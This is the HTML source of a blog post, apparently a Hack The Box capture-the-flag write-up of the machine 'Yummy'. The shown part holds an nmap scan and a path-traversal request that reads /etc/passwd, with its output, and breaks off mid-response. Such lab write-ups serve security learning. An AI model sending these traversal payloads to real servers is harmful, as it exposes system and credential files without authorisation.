@@ -1,0 +1,870 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2025/02/21/hackthebox-yummy/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewYummy is a hard-difficulty machine from Hack The Box dealing initially with an LFI exploit that’ll allow us to read cron jobs to be able to craft a custom admin JWT token and exploit an SQLI o">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: Yummy">
+<meta property="og:url" content="http://fouedsaidi.com/2025/02/21/Hackthebox-Yummy/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewYummy is a hard-difficulty machine from Hack The Box dealing initially with an LFI exploit that’ll allow us to read cron jobs to be able to craft a custom admin JWT token and exploit an SQLI o">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Yummy/Yummy.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Yummy/web.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Yummy/web1.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Yummy/web2.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Yummy/web2.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Yummy/backup.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Yummy/jwt.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Yummy/admin.png">
+<meta property="article:published_time" content="2025-02-21T10:13:21.000Z">
+<meta property="article:modified_time" content="2025-02-21T17:49:02.744Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Yummy/Yummy.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: Yummy -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":"https://www.instagram.com/saidi.foued/","zhihu":null,"twitter":"https://twitter.com/_kujen5","email":"foued.saidi.pro@gmail.com","linkedin":"https://www.linkedin.com/in/foued-saidi-pro/","facebook":"https://www.facebook.com/foued.saidi.980/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: Yummy</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-02-21 11:13:21</span>
+        <span class="mobile">2025-02-21 11:13:21</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-02-21 18:49:02</span>
+            <span class="mobile">2025-02-21 18:49:02</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>Yummy is a hard-difficulty machine from Hack The Box dealing initially with an LFI exploit that’ll allow us to read cron jobs to be able to craft a custom admin JWT token and exploit an SQLI on the admin dashboard. Later we’ll do some creds exfiltration to move laterally and leverage the hg Mercurial version control to move laterally once again to finally abuse rsync to land a root shell.<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Yummy/Yummy.png"
+                      alt="Yummy-info-card"
+                ><figcaption>Yummy-info-card</figcaption></figure></p>
+<h3 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h3><div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; nmap <span class="literal">-A</span> <span class="literal">-Pn</span> <span class="number">10.129</span>.<span class="number">192.97</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://nmap.org ) at <span class="number">2025</span><span class="literal">-02-21</span> <span class="number">15</span>:<span class="number">45</span> W. Central Africa Standard Time</span><br><span class="line">Nmap scan report <span class="keyword">for</span> yummy.htb (<span class="number">10.129</span>.<span class="number">192.97</span>)</span><br><span class="line">Host is up (<span class="number">0.39</span>s latency).</span><br><span class="line">Not shown: <span class="number">998</span> filtered tcp ports (no<span class="literal">-response</span>)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp open  ssh     OpenSSH <span class="number">9.6</span>p1 Ubuntu <span class="number">3</span>ubuntu13.<span class="number">5</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh<span class="literal">-hostkey</span>:</span><br><span class="line">|   <span class="number">256</span> a2:ed:<span class="number">65</span>:<span class="number">77</span>:e9:c4:<span class="number">2</span>f:<span class="number">13</span>:<span class="number">49</span>:<span class="number">19</span>:b0:b8:<span class="number">09</span>:eb:<span class="number">56</span>:<span class="number">36</span> (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> bc:df:<span class="number">25</span>:<span class="number">35</span>:<span class="number">5</span>c:<span class="number">97</span>:<span class="number">24</span>:f2:<span class="number">69</span>:b4:ce:<span class="number">60</span>:<span class="number">17</span>:<span class="number">50</span>:<span class="number">3</span>c:f0 (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp open  http    Caddy httpd</span><br><span class="line">|_http<span class="literal">-server-header</span>: Caddy</span><br><span class="line">|_http<span class="literal">-title</span>: Yummy</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">62.01</span> seconds</span><br></pre></td></tr></table></figure></div>
+<p>We can see that we have our usual ssh port and a web app deployed on port 80.</p>
+<h3 id="Web-Application-http-yummy-htb"><a href="#Web-Application-http-yummy-htb" class="headerlink" title="Web Application - http://yummy.htb"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://yummy.htb/" >http://yummy.htb <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h3><p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Yummy/web.png"
+                      alt="Web App"
+                ><figcaption>Web App</figcaption></figure></p>
+<p>We can see that we have a simple web app interface, let’s go ahead and register an account to login with:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Yummy/web1.png"
+                      alt="Web App"
+                ><figcaption>Web App</figcaption></figure></p>
+<p>We can see that we can also book a table, so let’s do that:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Yummy/web2.png"
+                      alt="Web App"
+                ><figcaption>Web App</figcaption></figure></p>
+<p>Checking our reservation on the dashboard, we can see that we can save the iCalendar for it:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Yummy/web2.png"
+                      alt="Web App"
+                ><figcaption>Web App</figcaption></figure></p>
+<p>Checking the request now:</p>
+<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/export/Yummy_reservation_20250221_150501.ics</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>yummy.htb</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Sec-GPC</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://yummy.htb/dashboard</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>X-AUTH-Token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6Imt1amVuQGt1amVuLmh0YiIsInJvbGUiOiJjdXN0b21lcl9kY2JiZTYxMSIsImlhdCI6MTc0MDE1MDIxNiwiZXhwIjoxNzQwMTUzODE2LCJqd2siOnsia3R5IjoiUlNBIiwibiI6IjEzMjQxODIxODE3NjYxNzA3MzQxMjkyNTg3MzgyMjMwMzgwMTkxNDQ2OTI0MjIwNzkyMzM4NDAzMzk4NDk4NTAzNTE0MjA4OTExMjM4NDU3OTE3NjUzMTIxNzY4MzgyNzQxNDI3NzQ5MTE2MjQyOTgwMDAwMDE5OTAyMzYwMjY4MzI2MzA4Njc0NTExMjMwMzk1OTc2MjIyODExODI1Nzc0NTYzNzQ4ODYzMDk4NzE5MTc3NzE5NDg5NzMyMDc4NzkzODgyODI4ODYwMDA0MjUxNzc4ODg3NjYyMzYxMzY0MjEyOTczNjkyNzU5MDUxNTczMzU4ODk3NDgwOTIyMzUwODc0MTcxNzQ1MzA5MDUxNDQ5MTA1ODgxMTc4NDEyNzkyMjQ2NzgyMzM5NjE3NTk3Mjg0MTA5MDA2OSIsImUiOjY1NTM3fX0.CQTHFLA2xheSgqnhTyzs8yFsBeOO97_ecILAJ2DR4_Bsd4J9HCIk9ziRrNBF6zu-6owoAb7TpUQR1P3AJTT5-aCRhpXA5qgFpcfuf7BMnAbiNAqICxTHmohM-UIAcIDWUAuEMvOQTUQZaZX9XFcDznCPiYY6vm_0IjcFrdfjOUigBHI; session=eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIlJlc2VydmF0aW9uIGRvd25sb2FkZWQgc3VjY2Vzc2Z1bGx5Il19XX0.Z7iWHQ.wbkM3uOrmgsNlMbYdJItwcSuFzc</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that the filename is being passwed in the URL, maybe LFI?</p>
+<h4 id="Local-File-Inclusion"><a href="#Local-File-Inclusion" class="headerlink" title="Local File Inclusion"></a>Local File Inclusion</h4><p>Let’s try to inject an LFI payload to try and read files:</p>
+<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/export/../../../../../../../../../../../etc/passwd</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>yummy.htb</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Sec-GPC</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://yummy.htb/dashboard</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>X-AUTH-Token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6Imt1amVuQGt1amVuLmh0YiIsInJvbGUiOiJjdXN0b21lcl9kY2JiZTYxMSIsImlhdCI6MTc0MDE1MDIxNiwiZXhwIjoxNzQwMTUzODE2LCJqd2siOnsia3R5IjoiUlNBIiwibiI6IjEzMjQxODIxODE3NjYxNzA3MzQxMjkyNTg3MzgyMjMwMzgwMTkxNDQ2OTI0MjIwNzkyMzM4NDAzMzk4NDk4NTAzNTE0MjA4OTExMjM4NDU3OTE3NjUzMTIxNzY4MzgyNzQxNDI3NzQ5MTE2MjQyOTgwMDAwMDE5OTAyMzYwMjY4MzI2MzA4Njc0NTExMjMwMzk1OTc2MjIyODExODI1Nzc0NTYzNzQ4ODYzMDk4NzE5MTc3NzE5NDg5NzMyMDc4NzkzODgyODI4ODYwMDA0MjUxNzc4ODg3NjYyMzYxMzY0MjEyOTczNjkyNzU5MDUxNTczMzU4ODk3NDgwOTIyMzUwODc0MTcxNzQ1MzA5MDUxNDQ5MTA1ODgxMTc4NDEyNzkyMjQ2NzgyMzM5NjE3NTk3Mjg0MTA5MDA2OSIsImUiOjY1NTM3fX0.CQTHFLA2xheSgqnhTyzs8yFsBeOO97_ecILAJ2DR4_Bsd4J9HCIk9ziRrNBF6zu-6owoAb7TpUQR1P3AJTT5-aCRhpXA5qgFpcfuf7BMnAbiNAqICxTHmohM-UIAcIDWUAuEMvOQTUQZaZX9XFcDznCPiYY6vm_0IjcFrdfjOUigBHI; session=.eJyrVopPy0kszkgtVrKKrlZSKAFSSsWlycmpxcVKOkpBqcWpRWWJJZn5eQop-eV5OfmJKakpClAFaaU5OZVKsbU6dNcYWwsACKRDYQ.Z7iW6g.QFyE5Knze3e13TVJKDiRYU1dtms</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>And we got a hit:</p>
+<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>attachment; filename=passwd</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>2033</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/octet-stream</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Fri, 21 Feb 2025 15:08:41 GMT</span><br><span class="line"><span class="attribute">Etag</span><span class="punctuation">: </span>&quot;1727686952.3123646-2033-4086239241&quot;</span><br><span class="line"><span class="attribute">Last-Modified</span><span class="punctuation">: </span>Mon, 30 Sep 2024 09:02:32 GMT</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Caddy</span><br><span class="line"></span><br><span class="line"><span class="language-ruby"><span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">daemon:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:daemon</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/usr/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">2</span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">sys:</span><span class="symbol">x:</span><span class="number">3</span><span class="symbol">:</span><span class="number">3</span><span class="symbol">:sys</span><span class="symbol">:/dev</span><span class="symbol">:/usr/sbin/nologin</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">sync:</span><span class="symbol">x:</span><span class="number">4</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:sync</span><span class="symbol">:/bin</span><span class="symbol">:/bin/sync</span></span></span><br><span class="line"><span class="language-ruby"><span class="symbol">games:</span><span class="symbol">x:</span><span class="number">5</span><span class="symbol">:</span><span class="number">60</span><span class="symbol">:games</span><span class="symbol">:/usr/games</span><span 